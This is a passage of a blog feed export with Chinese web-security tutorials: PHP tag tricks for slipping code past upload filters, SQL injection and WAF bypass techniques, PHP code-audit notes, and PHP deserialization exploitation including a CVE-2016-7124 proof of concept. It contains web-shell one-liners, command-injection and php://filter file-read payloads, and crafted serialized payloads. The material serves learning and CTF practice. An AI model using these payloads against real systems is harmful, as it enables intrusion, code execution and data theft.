      <content type="text"><![CDATA[1 前言PHP有几种解析标签的写法来标识php代码，其中最标准的&lt;?php ?&gt;,当php解析器找到这个标签时，就会执行标签内部的代码，但在实际的应用时，尤其在上传对内容过滤了&lt;?和php，在这里重点介绍一下 2 PHP代码解析标签A 脚本标签形式：&lt;script language=&quot;PHP&quot;&gt;...&lt;/script&gt;,这种写法有点像JavaScript,不过也可以正常解析PHP代码 举例： &lt;script language=”PHP”&gt;include_once(“$_POST[J_drOps]”);&lt;/script&gt; 这样的话对于绕过过滤了&lt;?和php的问题，屡试不爽还有一个常用的样式，就是利用反引号执行命令（``） &lt;script language=&quot;PHP&quot;&gt;echo `$_POST[id]` ;&lt;/script&gt; 实际上反引号（``）执行的命令是调用了shell_exec()函数，我们来看具体的测试 B 短标签&lt;?….?&gt;，使用短标签前需要设置php.ini中设置short_open_tage=on,默认是on状态。 C asp标签&lt;%…%&gt;，在PHP3.0.4版本后可用，需要在php.ini中设置asp_tags=on,默认是off]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[sql注入绕过技巧]]></title>
      <url>%2F2016%2F10%2F25%2Fsql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%2F</url>
      <content type="text"><![CDATA[1 前言SQL注入绕过的技巧要看具体的环境，可以自己搭建测试，最好是在渗透测试的过程中遇到的环境，否则若仅靠自己凭空想，显然是不靠谱的。这篇文章我会总结一些之前遇到的绕过奇淫技巧，随着自己的见识和能力增强，相信自己总结的方法也会增多。 2 比较符（&lt;,&gt;)绕过在测试盲注时，使用二分查找的时候需要使用到比较操作符来进行查找，若无法使用比较操作符可以使用到greatest来进行绕过。常见的盲注语句如下： select * from users where id=1 and ascii(substr(database(),0,1))&gt;72 若比较操作符被过滤掉，其盲注语句即无法正常使用，则可以使用greatest来代替比较操作符greatest（n1,n2,n3,等）函数返回输入参数（n1,n2,n3,等）的最大值。 我们可以利用greatest进行上面盲注测试： select * from users where id=1 and greatest(ascii(substr(database(),0,1)=72 总结：利用greatest()函数绕过比较操作符 3 引号绕过在进行sql语句测试时在限定的where子句中会使用到引号””,看具体的代码： select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users” 如果引号被过滤掉，那么上面的where语句则无法使用，遇到这样的问题我们可以使用十六进制来处理这个问题，users的十六进制的字符串是7573657273。那么最后的sql语句就变为了： select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 -总结：使用十六进制可以绕过引号 4 逗号的绕过在测试盲注的的时候，会利用到substr(),mid(),limit(),这些子句的方法都需要使用到逗号，对于substr()和mid(）这两个方法可以使用from for 的方法来解决 select substr(database(0 from 1 for 1); select mid(database(0 from 1 for 1); 对于limit可以使用offset来绕过 select * form news limit 0,1; #等价下面的sql语句 select * from news limit 1 offset 0; 总结：使用from绕过逗号 5 注释，括号，%a0绕过空格sql注入时，空格的使用是非常普遍的，比如利用union来获得目标的数据 and 0 union select null,null,null #上面语句中，and两侧，union两侧，select两侧都需要空格####注释绕过空格 /注释/ select user() from info; #########利用注释替换空格，就可以变成 select//user()//from/**/info或者： /**/un/**/io/**/n/**/sel/**/ec/**/t/**/1,2,3,4,5,5 from admin 第二种注释：/*!and*/ 1=2 ####括号绕过空格在mysql中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端可以没有多余的空格。括号绕过空格的方法，在基于时间的盲注时，是屡试不爽 select user() from info where 1=1 and 2=2 如何把括号减到最少？，观察user()可以算值，故user()两边要加括号，变成： select(user())from info where 1=1 and 2=2;继续，1=1和2=2可以算值，也加括号，去空格，变成： select(user())from info where(1=1)and(2=2); info两边的空格，通常是由程序员自己添加，我们一般无法控制，所以上面就是空格最少的的结果 在以一条time base盲注语句做一个总结： ?id=(sleep(ascii(mid(user()from(2)for(1)))=109)) 6 绕waf测试套路尤其在做CTF比赛时，存在waf最令人头疼，语句的正常注射也是尤为关键，我们这时候可以尝试特殊字符的情况，特殊字符有 !@#$%^&amp;*()_-+&lt;&gt;?/|~ 若在测试的时候某一个字符被替换为空，我们可以得出结论，此字符可以被正常的接受，然后就是用这个字符和语句结合来绕过waf 7 绕过waf 360等防注入软件A 大小写变种使用起来最简单，效果现在来说不是太显著，比如：and 1=2 AnD 1=3； B 使用URL编码正常编码&#39;为%27 /=%2f %=%25 *==%2a /**/==%252f%252a*/ C 利用嵌套剥离有些过滤器会从用户的输入中进行剥离一些敏感的函数，故可以通过函数的嵌套进行绕过一次剥离； selselectect 剥离后为select D 使用空字节一些过滤器在处理输入时，若碰到孔子姐就会听之处理，故通常可以利用空字节绕过过滤器。id=1%00 and 1=2 E 避开自定义的过滤器一些过滤器所过滤的字符串都是事先写入写好的，故只要我们输入的语法和她们过滤的不匹配即可绕过。and 转换为 a+nd a%nd &#39;a&#39;nd %A0and 8 命令执行时过滤了空格若命令执行时过滤了空格，则可以利用&lt;&gt;来绕过，比如php&lt;&quot;/tmp/code.php&quot;&gt;&quot;/tmp/result.txt&quot;，这条命令里没有空格，会执行code.php里面的代码并且输出重定向到result.txtx里面，还有注意的是，在做命令执行时，很可能命令无法列出所有的文件，可以去php里面找相关的函数来列文件，链接]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[代码审计基础]]></title>
      <url>%2F2016%2F10%2F22%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%2F</url>
      <content type="text"><![CDATA[1 审计方法与步骤A 审计前的准备1 获得源码-安装网站（在本地搭建网站，一边审计一边测试，实时跟踪各种动态变化) 2 把我大局 网站结构（浏览源码文件夹，了解程序的大致目录） 入口文件（index.php,admin.php文件一般是整个文件的入口，详细读一下index.php文件可知道程序的架构，运行流程等） 配置文件（一般类似config.php等文件，保存一些数据库相关信息程序的一些信息。先看看数据库编码，如果是gbk则可能存在宽字节注入。如果变量的值是双引号，则可能存在双引号解析代码执行问题） (重点）过滤功能-通过详读公共函数文件和安全过滤文件，清晰掌握用户输入的数据，哪些被过滤，哪些无过滤；过滤方式是替换还是正则?有没有GPC？有没有使用addslasher()处理 B 审计方法 通读源码（一般是企业对自身产品的审计，对于小型应用也可读一读）—-方法：把握大局，然后根据入口文件进行各个模块的审计 敏感函数参数回朔法（shell_exec)—利用Seay法师审计系统，然后可以分析判断敏感函数的上下文，追踪参数源头 (重要）定向功能分析法–主要根据程序的业务逻辑来审计，首先用浏览器逐个访问浏览，看看这套程序有哪些功能。根据相关功能，大概存在哪些漏洞。 常见功能漏洞：（包括但不限于） 初始化安装 站点信息泄露 文件上传，管理 登录认证，权限管理 数据库备份恢复 找回密码 验证码总结： 首先，把握大局，不管什么程序，都要把握大局 其次，根据定向功能针对每一项功能进行审计； 最后，就是明娜函数参数回溯2 常见的INI配置A 配置文件 php.ini： 在PHP启动时被读取。对于服务器模块版本的PHP，仅在web服务器启动时读取一次 .user.ini文件：自PHP5.3.0起，php支持基于每个目录的.htaccess风格的INI文件 还可以在httpd.conf中覆盖php.ini的值，以进行更灵活的配置 B 配置文件语法C 变量相关的配置php.ini- 变量相关： 启用全局变量 register_globals = off 作用是关闭自动注册的全局变量，在设置为on的时候，php会将$_POST,$_GET,$_COOKIE,$_ENV,$_SESSION数组总的$key-&gt;$value直接注册为变量，比如$_POST[“username”]就会被注册为$username 虽然方便了调用，但是有三个问题： 不知道变量是哪里来的$_POST的还是$_SESSION来的，非常不方便阅读代码 变量之间互相覆盖，引起不必要的麻烦(重点） 安全问题，所以要设置为off短标签：short_open_tag = on这个设置决定是否使用PHP代码开始标志的缩写形式（&lt;??&gt;），若禁用，开始标签必须是完整形式（&lt;?php ?&gt;）同时会影响到缩写形式&lt;?=,它和&lt;?echo等价，从php5.4.0起,&lt;?=总是可用的主要在文件上传使用到，若开启我们可以在上传一句话等使用变形 D 安全模式的配置safe_mode = off（默认） 能够控制一些php中的函数，比如system(),同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的文件，比如/etc/passwd，但是默认的php.ini是没有打开安全模式的本特性已经在PHP5.3.0起飞起并将PHP5.40起移除 禁用类/函数disable_classes=,disable_functions=,disable_function=opendir,readir,scandir,fopen,unlink禁用某些类，禁用某些函数。接受函数分隔的函数名列表作为参数。只能设置在php.ini中 E 上传文件及目录权限的配置设置上传及最大上传文件大小file_uploads = onupload_max_filesze = 8M文件上传的临时目录upload_tmp_dir=上传临时文件保存的目录，需要可写，如果不设置，则采用系统临时目录（/tmp,C:\Windows\temp)用户访问目录限制open_basedir = .:/tmp/ linux下:代表不同目录的分隔；windows下;代表不同目录分割能够避免PHP脚本访问不应该访问的文件，一定程度上限制了phpshell的危害。我们一般可以设置为只能访问网站目录，表示允许访问当前目录（即PHP脚本文件所在目录）和/tmp/目录，有效防止php木马跨站运行 F 错误信息的配置错误信息控制：display_error = On站点发布后应关闭此功能，以免暴漏信息，调试的时候为了输出错误信息，故打开设置错误报告级别：error_reporting = E_ALL这个设置的作用是将错误级别设置为最高，可以显示所有的问题，方便查错，也有利于写出高质量的代码。推荐使用E_ALL|E_STRICT,即所有级别。错误日志：error_log=错误日志的位置，必须对web用户可写入，如果不定义则默认写入到web服务器的错误日志中log_errors = on如下所言，建议将错误日志输出到文件，而不知直接输出到前端 G 魔术引号及远程文件的配置魔术引号（本特性已自PHP5.3.0起废弃并将自PHP5.4.0起移除magic_quotes_gpc = Ongagic_quotes_runtime = Off为GPC（Get/Post/Cookie)操作设置magic_quotes状态，当magic_quotes为on，所有单引号，双引号，反斜杠和NULL(%00)被一个反斜杠自动转义是否允许打开远程文件allow_url_fopen = on是否允许包含远程文件（include/require)allow_url_include = false 3 常见危险函数及特殊函数代码执行函数eval$assert（调试函数，和eval同样有把字符长当做php执行的功能）&amp;preg_replace mixed eval(string $code)把字符串$code作为php代码执行很多的webshell都是用的eval执行具体的操作&lt;?php @eval($_POST[“0”]);?&gt; bool assert(mixed $assertion[string $description])检查一个断言是否为FALSE因为大多数杀软把eval列入黑名单，故用assert来替代eval来执行具体的操作 preg_replace($pattern, $replacement, $string)搜索$string中符合正则规则$pattern的部分，以$replacement替换，返回替换后的内容。/e修正符使preg_replace()将replacement参数当做php代码包含函数require，include，require_once，include_once包含函数也能读取任意文件内容，这需要用到[支持的协议和封装协议]和[过滤器]例如：利用php流filter读取任意文件include($_GET[“file”]);?file=php://filter/convert.base64.encode/resource=index.php命令执行函数 exec() -执行一个外部程 * passthru() - 执行外部程序并显示原始输出 * proc_open() - 执行一个命令并打开文件指针用于读取以及写入 shell_exec() - 通过 Shell 执行命令，并将执行结果作为字符串返回 * system() - 允许执行一个外部程序并回显输出，类似于 passthru()。 * popen() - 通过popen()参数传递一条命令，并对popen()所打开的文件进行执行 只要命令的参数可控就能执行系统命令例如： system($cmd);或者system(&apos;ping -c 3&apos;.$target); 当$cmd可以控就能执行任意命令 当$target可控的话，可以使用管道符等特殊函数截断从而执行任意命令 $target = &apos;a | whoami&apos;: 大体的思路就是，先把握大局-&gt;针对漏洞有目的的搜索危险函数-&gt;定位危险函数所在文件-&gt;回溯危险源-&gt;找到执行的函数-&gt;过滤防护 文件操作函数 copy -拷贝函数 file_get_contents - 把整个文件读入为一个字符串 file_put_contents -将一个字符串写入文件 file -把整个文件读入一个数组中 fopen - 打开文件或者URL move_uploaded_file -将上传的文件移动到新的位置 readfile - 输出文件 rename -重命名一个文件或目录 rmdir -删除目录 unlink&amp;delete - 删除文件 任意文件读取写入删除往往是上面几个函数收到了控制 特殊函数 string getenv(string $varname)获取一个环境变量 bool putenv(string $setting)添加setting到服务器环境变量，环境变量仅存活与当前请求期间，在请求结束时环境就会自动恢复到初始状态 配置相关 string ini_get(string $varname) 成功时返回配置选项的值 string ini_set(string $varname,string $newvalue) string ini_alter(string $varname,string $newvalue) 设置指定配置选项的值，这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。 &lt;?php splay_errors = &quot;.(ini_get(&apos;display_errors&apos;)?&apos;On&apos;:&apos;Off&apos;); ini_set(&quot;display_errors&quot;,0); echo &quot;\r\n&lt;br/&gt;display_errors = &quot;.(ini_get(&apos;display_errors&apos;)?&apos;On&apos;:&apos;Off&apos;); ?&gt; 数字判断 bool is_numeric(mixed $var)如果var是数字和数字字符串则返回TURE，否则返回FALSE，如果仅用is_numeric判断而不用inval转换就有可能插入16进制的字符创到数据库中，进而导致sql的二次注入 数组相关 bool in_array(mixed $needle,array $haystack[,bool $strict = FALSE]) 在haystack中搜索needle，若没有设置strict则使用宽松的比较。该函数有一个特性，比较之前会进行自动类型转换 $a = &apos;1abc&apos; in_array($a,array(1,2,3)的返回值会是真 变量覆盖 - void parse_str(string $str[,arrary &amp;$arr]) 若str是URL传递的查询字符串(query string),则将它解析为变量并设置到当前域。 &lt;?php //parse_str $str = &quot;first=value&amp;arr[]=foobar&amp;arr[]=baz&quot;; echo &quot;&lt;pre&gt;&quot;; parse_str($str,$array); print_r($array); var_dump(isset($first));//已经复制到数组中，不在当前域 parse_str($str); var_dump(isset($first)); echo &quot;\$first = $first&quot;; echo &quot;r\n&lt;br /&gt;&quot;; echo &quot;\$arr[0]=$arr[0]&quot;; echo &quot;r\n&lt;br /&gt;&quot;; echo &quot;\$arr[1]=$arr[1]&quot;; ?&gt; &lt;pre&gt;Array ( [first] =&gt; value [arr] =&gt; Array ( [0] =&gt; foobar [1] =&gt; baz ) ) bool(false) bool(true) $first = valuer &lt;br /&gt;$arr[0]=foobarr &lt;br /&gt;$arr[1]=baz[Finished in 0.1s] 列目录 glob()函数依照libc glob()函数使用的规则寻找所有与pattern匹配的文件路径； &lt;?php //glob echo &quot;&lt;pre&gt;&quot;; print_r(glob(&quot;t*.php&quot;));//匹配t开头的 ?&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[代码审计知识储备]]></title>
      <url>%2F2016%2F10%2F21%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E5%82%A8%E5%A4%87%2F</url>
      <content type="text"><![CDATA[一． 漏洞挖掘1.1危险的来源数据显示输入：所有提交的变量都被php保存在了一些数组里，PHP中可由用户用户输入的变量列表如下： $_SERVER –服务器和执行环境（是一个包含了诸如头信息，路径，以及脚本位置等等信息的数组 $_FIES-HTTP文件上传变量 $_ENV-环境变量（通过环境方式传递给当前脚本的变量数组）getenv-获取一个环境变量 string getenv(string $varname)在 php 的设置里有这么个选项register_globals,当这个选项为 on 的时候,上面出现的那些变量都会成为$GLOBALS 中的一员,在脚本中都不需要再取得就可以直接使用,并且以variables_order的顺序覆盖。 $GLOBALS-引用全局作用域中可用的全部变量（一个包含了全部变量的全局组合数组。变量的名字就是数组的键。 很多程序考虑到了register_globals=off的情况，于是在程序化的时候使用如下代码： @extract(daddslashes($_POST)); @extract(daddslashes($_GET)); extract-从数组中将变量导入到当前的符号表中 注释：把数组内容导入到符合表，比如$_COOLIE[“123”],那么经过他的非法字符过滤后，extract函数后变为$a=”123 ”这样子的模式。daddslashes()-是addslashes()函数的加强版，可以对数组里面的每一个元素添加反斜杠 这些代码起到了register_globals的作用，作用是将post和GET的内容释放出去做全局变量，但是危险可能更大。 二．隐式输入 用户传递的数据-&gt;数据库-&gt;程序代码处理-&gt;程序代码 这个模式的意思就是用户输入的可能先进入了数据库，然后程序从数据库再取得这个输入送入某些危险的函数执行。 与存储在数据库中类似的情况是，一些程序把用户的输入放入文件夹中，如缓冲文件，然后在必要的时候从里面取得，如果太过于相信这些地方的变量，这样还是导致问题的。 三． 变量覆盖####常见的变量覆盖 1.extract()-从数组中将变量导入到当前的符号表中 Int extract(array &amp;$var_array[,int$extract_type= EXTR_OVERWRITE [, string $prefix = NULL]] ) 本函数用来将变量从数组中导入到当前的符号表中。检查每一个键名看是否可以作为一个合法的变量名，同时检查和符号表中已有的变量名的冲突。$var_array一个关联数组。此函数将键名当作变量名，值作为变量的值$extract_type:对待非法/数字和冲突的键名的方法将根据extract_type的参数决定 2.parse_str()-将字符串解析成多个变量void parse_str ( string $str [, array &amp;$arr ] )如果str是URL传递的查询字符串（query string），则将它解析为变量并设置到当前作用域。 参数：str 输入的字符串 arr：若设置了第二个变量arr，变量将会以数组元素的形式存入到这个数组，作为代替]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP序列化以及反序列化]]></title>
      <url>%2F2016%2F10%2F18%2FPHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
      <content type="text"><![CDATA[什么是序列化以及反序列化序列化是将PHP中的值（zval）转换成一段包含字节流的字符串。序列化一个对象会保存为对象中的所有变量的值，但不会保存对象的方法，以及只会保存类的名字。其本质就是将程序以相应的格式保存下来 反序列化：对单一的一序列化的变量进行操作，将其转换回PHP的值。 PHP序列化方式php在序列化的时候会将相应的变量以对应的键值进行存储。 实例化对象中自身的二次赋值 对象的序列化 O:类名长度:”类名”:值:{} &lt;?php //1.要创建一个类的实例，必须要使用new关键字 2.用array()语言创建一个数组，它接受任意数量用逗号分割的 键（key） =&gt; 值（value）对 $o = new stdClass; $o-&gt;foo = $o; $s = serialize($o); print $s; //结果： O:8:”stdClass”:1:{s:3:”foo”;r:1;} //对象的序列化 O:类名长度:”类名”:值:{} ?&gt; 数组中的引用(&amp;)的序列化 数组的序列化 array通常被序列化为： a::{…} 表示数组元素的个数，、…… 表示数组下标，、…… 表示与下标相对应的数组元素的值。 &lt;?php $a = [“foo”];//数组里的字符串会被当做一个整体对待； $a[1] =&amp; $a[0];// 数组中的引用（&amp;）的序列化 echo $a[1]; echo “——-“; $s = serialize($a); echo $s; //结果： a:2:{i:0;s:3:&quot;foo&quot;;i:1;R:2;} //这里的R:2；部分意味着“指向第二个值”什么是第二个值？整个数组代表第一个值，(s:3:&quot;foo&quot;)代表第二个值 // ?&gt; 序列化键名对照表数组中二次赋值（&amp;） ： R； 对象的二次赋值： r； NULL： N； ture： b:1; false: b:0; Long: i; Double: d; String: s/S; Class: C; Array: a; Object: O; 变量的不同属性也有着不同的格式： public： key; protected： \0*\0key; private: \0key\0; 实例观察public/protected/private的区别&lt;?php class Test { public $public = 1; protected $protected = 2; private $private = 3; } $a = new Test(); $s = serialize($a); //echo &quot;$s&quot;; var_dump($s);//var_dump()会返回变量的数据类型和值 //结果： string(81) &quot;O:4:&quot;Test&quot;:3:{s:6:&quot;public&quot;;i:1;s:12:&quot;\000*\000protected&quot;;i:2;s:13:&quot;\000Test\000private&quot;;i:3;}&quot; ?&gt; ###String对应的两个键：s与Sserialize()和unserialize()处理有着一些差异。PHP源码serialize()中没有相关序列化是以S为标识的，但是在unserialize中又有对S键的相关处理，相关部分源码 &lt;? php case &apos;S&apos;: goto yy10; ... yy10: yych = *(YYMARKER = ++YYCURSOR); if (yych == &apos;:&apos;) goto yy39; goto yy3; ... yy39: yych = *++YYCURSOR; if (yych == &apos;+&apos;) goto yy40; if (yych &lt;= &apos;/&apos;) goto yy18; if (yych &lt;= &apos;9&apos;) goto yy41; goto yy18; case &apos;s&apos;: goto yy9; ... yy9: yych = *(YYMARKER = ++YYCURSOR); if (yych == &apos;:&apos;) goto yy46; goto yy3; ... yy46: yych = *++YYCURSOR; if (yych == &apos;+&apos;) goto yy47; if (yych &lt;= &apos;/&apos;) goto yy18; if (yych &lt;= &apos;9&apos;) goto yy48; goto yy18; ... ... ?&gt; 如果细心地话，会发现s和S就会发现两个键的处理方式是一模一样的 PHP中SESSION反序列化机制1 简介在php.ini中存在的三项配置项 1.session.save_path=&quot;&quot; --设置session的存储路径 2.session.save_handler=&quot;&quot; --设置用户自定义存储函数，若想使用PHP内置会话存储机制之外的可以使用本函数（数据库等方式） 3.session.auto_start boolen --指定会话模块是否在请求开始时自动启动一个会话。默认为0 4.session.serialize_handler string --定义用来序列化/反序列化的处理器名字。默认为php 以上具体选项就是PHP中的session存储和序列话存储相关的选项 在使用xampp组件安装中，上述的配置项的设置如下： 1.session.save_path=&quot;D:\phpstudy\tmp\tmp&quot; 表明所有的session文件都是存储在xampp/tmp下 2.session.save_handler=&quot;file&quot; 表名session是以文件的方式进行存储的 3.session.auto_start=0 表明默认不启动session 4.session.serialize_handler=php 表明session的默认序列话引擎使用的是php序列话引擎 在上述配置中，session.serialize_handler是用来设置session的序列话引擎，出除了默认的php引擎外还有其它的引擎，不同的引擎对应的session的存储方式不同 A：php_binary:存储方式，键名的长度对应的ASCII字符+键名+经过serialize函数序列化处理的值 B：php存储的方式 ： 键名+竖线+经过serialize函数序列化处理的值 C：php_serialize(php&gt;5.5.4)存储方式，经过serialize函数处理的值 在php中默认使用的PHP引擎，如果修改为其他的引擎，只需要添加代码ini_set(“session.serialize_handler”,”需要设置的引擎”.示例代码如下： &lt;?php ini_set(&quot;session.serialize_handler&quot;,&quot;php_serialize&quot;); session_start; //do something ?&gt; 2 存储机制php中的session中的内容并不是放在内存中，而是以文件的方式来存储，存储的方式也是由配置项session.save_handler来确定，默认是以文件的形式存储。 文件的内容就是session值得序列化之后的内容。 若我们的环境是xampp，在默认的配置下： &lt;?php session_start(); $_SESSION[&quot;name&quot;]=&quot;spoock&quot;; var_dump(); ?&gt; 最后的session的存储和显示如下：可以看到PHPSESSID的值是jo86ud4jfvu81mbg28sl2s56c2，而在xampp/tmp下存储的文件名是sess_jo86ud4jfvu81mbg28sl2s56c2，文件的内容是name|s:6:”spoock”;。name是键值，s:6:”spoock”;是serialize(“spoock”)的结果。 在php_serialize引擎中 &lt;?php ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;); session_start(); $_SESSION[&quot;name&quot;] = &quot;spoock&quot;; var_dump(); ?&gt; session文件中的内容 a:1:{s:4:”name”;s:6:”spoock”},a:1是使用php_serialize都会加上。同时使用php_serialize会将session中的key和value都会序列化。 在php_binary引擎中： &lt;?php ini_set(&quot;session.serialize_handler&quot;,&quot;php_binary&quot;) session_start(); $_SESSION[&quot;name&quot;] = &quot;spoock&quot; var_dump(); ?&gt; session文件中的内容是EOTname:6:”spoock”;由于name的长度为4,4在ASCII表中对应的值就是EOT。根据php_binary的存储规则，最后就是EOTname:6:”spoock”；ASCII的值为4的字符无法在网页上面显示。 3 序列化的简单运用补习php中$this-&gt;$this的含义表示 实例后的具体对象 我们一般先声明一个类，然后用这个类去实例化对象！ &lt;?php class User{ public $name; function __getname(){//简言之定义一个类的方法 echo $this-&gt;name; } } $user1 = new User(); $user1-&gt;name = &apos;张三&apos;; $user1-&gt;getName(); //这里就会输出张三！ $user2 = new User(); $user2-&gt;name = &apos;李四&apos;; $user2-&gt;getName(); //这里会输出李四！ ?&gt; 运用实例 22.php &lt;?php class syclover{ var $func = &quot;&quot;;//var 定义类的属性为公共，var和public一个意思 function __construct(){ $this-&gt;func = &quot;phpinfo()&quot;;//$this 实例化后的具体的对象 } function __wakeup(){ eval($this-&gt;func);//eval()函数把字符串当做PHP代码执行 } } unserialize($_GET[&quot;a&quot;]); ?&gt; 在第11行对传入的参数进行了序列化，我们可以传入一个特定的字符串，反序列化为syclover的一个实例，那么就可以执行eval()的方法。我们访问http://localhost/22.php?a=O:8:&quot;syclover&quot;:1:{s:4:&quot;func&quot;;s:14:&quot;echo “spoock”;”;}，反序列化得到的内容是： objict(syclover)[0] public &quot;func&quot; =&gt;string &apos;echo &quot;spoock&quot;;&apos;; 最后页面输出的就是spoock，说明最后执行啦我们定义的echo “spoock”方法，这就是一个序列化漏洞的具体过程。 4 php session触发过程的实际应用存在test01.php和test02.php两个文件所使用的session引擎不一样，即机制不同，我们可以在某一页面将数据序列化存放，在另一个页面进行反序列化访问，从而实现类。具体看一下代码test01.php使用php_serialize来处理session &lt;?php ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;); session_start(); $_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;]; ?&gt; test02.php使用php来处理session &lt;?php ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;); session_start(); class lemon { var $hi; function __construct(){ $this-&gt;hi = &apos;phpinfo();&apos;; } function __destruct() { eval($this-&gt;hi); } } ?&gt; 当访问的时候提交如下的数据： http://localhost/test01.php?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo “spoock”;”;} 此时传入的数据会按照php_serialize来进行序列化，此时访问http://localhost/test02.php，页面输出spoock成功执行了我们构造的数据，就会实例化lemon对象，最后会执行析构函数中的eval()方法。 技巧1.在实际进行渗透测试或者CTF中遇到session反序列化时，若发现session.upload_progress.enabled开着即等于1时，php会记录上传文件的进度，再上传时将信息保存在$_SESSION中。若文章测试使用如$_SESSION[“ryat”] = $_GET[“ryat”],然而很多时候没有这个条件，session.upload-progress.php,php为我们提供了一个上传进度的数据（当一个上传在处理中，同时POST一个与INI中设置的session.upload_process.name同名变量时，上传进度可以在$_SESSION中获得）即$n = ini_get(“session.upload_progress.nmae);会把它存储在$_SESSION[“$n”]当中，这样我们就可以构造一个文件上传页，就可以成功写入session。 一个上传进度数组的结构的例子 &lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;ryat&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt; &lt;/form&gt; 2.在PHP中普通的传值赋值行为有一个例外就是碰到object时，在PHP中使用引用赋值的，除非明确使用了clone关键字来拷贝，PHP支持引用来赋值，使用”$var = &amp;$othervar;”语法。引用赋值意味着两个变量指向了一个变量，没有拷贝任何的东西。举个简单地例子： a = 1; b = &amp;a; a = a+1; 由于引用参数，a和b引用的是同一个数据，因此a+1后，b也会变成2. CTF利用： &lt;?php class just4fun { var $enter; var $secret; } if (isset($_GET[&apos;pass&apos;])) { $pass = $_GET[&apos;pass&apos;]; if(get_magic_quotes_gpc()){//取得PHP环境变数magic_quotes_gpc的值，当magic_quotes_gpc打开时，所有的单引号，双引号，反斜线and空字符会自动转换为含有反斜线的溢出字符； $pass=stripslashes($pass);//stripslashes()函数删除由addslashes()函数添加的反斜杠 } $o = unserialize($pass); if ($o) { $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&apos;t fool me&quot;; } else echo &quot;are you trolling?&quot;; } ?&gt; 我们构造访问http://localhost/serializeTest.php?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}顺利输出Congratulation! Here is my secret: * 5 CVE-2016-7124反序列化漏洞漏洞概述： SugarCRM（http://www.sugarcrm.com/ ）是一套开源的客户关系管理系统。在其&lt;=6.5.23的版本中存在序列化漏洞，程序对攻击者恶意构造的序列化数据进行了反序列化的处理，从而使攻击者可以在未授权的情况下中兴任意的代码。 对于此漏洞简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 知识储备： unserialize()函数会检查勒种是否存在一个魔术方法wakeup方法，若存在会先调用wakeup方法，预先准备对象需要的资源 __wakeup()方法经常用在反序列化的操作中，例如重新建立数据库的连接，或建立其它初始化操作 get_object__var()函数返回由对象属性创建的关联数组。 具体测试代码： &lt;?php class A{ var $a = &quot;test&quot;; function __destruct(){ $fp = fopen(&quot;D:\\phpStudy\\WWW\\hello.php&quot;,&quot;w&quot;); fputs($fp,$this-&gt;a); fclose($fp); } function __wakeup() { foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo &quot;Waking up...\n&quot;; } } $test = $_POST[&apos;test&apos;]; $test_unser = unserialize($test); ?&gt; 使用payload进行测试，结果如下：发现__wakeup函数成功执行，消除了对象属性，从而hello.php内容也没空。 漏洞证明： 我们将上面的test=O:1:”A”:1:{s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;}中的A的个数变成2或者大于2的数字如下： test=O:1:”A”:2:{s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;} 然后在执行就会发现绕过了__wakeup函数，成功将phpinfo()写入到hello.php]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[python3 检测URL重定向到的地址]]></title>
      <url>%2F2016%2F10%2F16%2Fpython3-%E6%A3%80%E6%B5%8BURL%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E7%9A%84%E5%9C%B0%E5%9D%80%2F</url>
      <content type="text"><![CDATA[前言 最近一直考虑，如何持续的保持我对python学习的热度，思考是否能够尝试任务自动化，简言之，就是有些繁琐的事情利用脚本来实现。今天我讨论学习的任务是如何检测URL重定向到的地址，遗憾的是对https：//检测没有实现。实现的原理倒是也简单，就是判断站点返回来的status_code判断是否为3xx，若是，则就简单粗暴地人为是重定向，比如一些突发情况，如访问超时，域名解析错误，网络错误等，则利用try…except…来避免，需要检测的大量的url放入到一个文件中，若站点的格式不统一的话，就做一个简单判断 知识点简单补充 startswith()方法用于检测字符串是否是以指定子字符串开头 strip()方法用于移除字符串头尾指定的字符（默认为空格）。 使用列表推导式 x**2 for x in num if x &gt; 0 [one_ture] if [expression] else [on_false] map(lambda x:x**2,filter(lamber x :x&gt;0,num)) i.strip() for i in open(xxx).readlines() 脚本代码import sysimport requestsdef check_for_redirects(url): #利用allow_redirects=False r = requests.get(url,allow_redirects = False ,timeout = 0.5) try: if 300 &lt;= r.status_code &lt;= 400: return r.headers[&quot;response&quot;] else: return &quot;[no redirects]&quot; except requests.exceptions.Timeout: return &quot;[Timeout]&quot; except requests.exceptions.ConnectTimeout: return &quot;[ConnectTimeout]&quot; except requests.exceptions.SSLError: return &quot;[SSLError]&quot; def check_domains(urls): for url in urls: check_url = url if 